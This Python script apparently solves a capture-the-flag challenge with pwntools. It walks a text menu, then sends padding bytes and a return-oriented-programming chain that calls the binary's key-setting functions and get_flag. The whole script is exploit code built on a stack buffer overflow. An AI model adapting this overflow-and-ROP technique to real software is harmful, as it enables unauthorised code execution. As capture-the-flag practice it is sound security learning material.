#!/usr/bin/python3
from pwn import *
import time


def setup_for_chain(p):
    print(p.recvuntil(b'Your choice: ').decode())
    p.sendline(b'2')
    print(p.recvuntil(b'room to enter: ').decode())
    p.sendline(b'4')
    print(p.recvuntil(b'Your choice: ').decode())
    p.sendline(b'3')

    print(p.recvuntil(b'Press Q to exit: ').decode())
    p.sendline(b'Stephen')
    print(p.recvuntil(b'Enter something: ').decode())


def generate_payload(base_address):
    binary = ELF('challenge')
    binary.address = base_address
    chain = ROP(binary)

    payload = b''
    payload += b'A'*20
    payload += b'G'*4
    payload += b'B'*4
    chain.AAsDrwEk()
    chain.get_key2()
    chain.get_key1(0xfeedc0de)
    chain.set_key4()
    chain.get_flag()
    payload += chain.chain()
    print(chain.dump())
    return payload


def exploit(p, *args, **kwargs):
    setup_for_chain(p)
    payload = generate_payload(*args)
    p.sendline(payload)
    resp = p.read()
    print(resp.decode())
